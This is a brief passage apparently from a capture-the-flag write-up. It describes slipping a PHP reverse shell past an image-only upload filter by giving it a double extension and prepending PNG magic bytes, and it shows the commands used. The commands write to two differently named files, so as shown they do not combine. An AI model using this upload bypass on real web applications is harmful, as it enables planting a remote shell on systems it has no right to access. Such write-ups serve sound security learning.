Foothold

Actually, we cannot upload exactly 'arbitrary' file, but we can only upload 'png, jpeg, gif, jpg' extensions. Therefore, we have to name our malicious file like rev_shell.php.png. Also, to falsify file format, we might have to append magic bytes.

└─$ nano rev.php

└─$ echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> hex_rev.php.png
└─$ cat rev.php >> img_rev.php.png
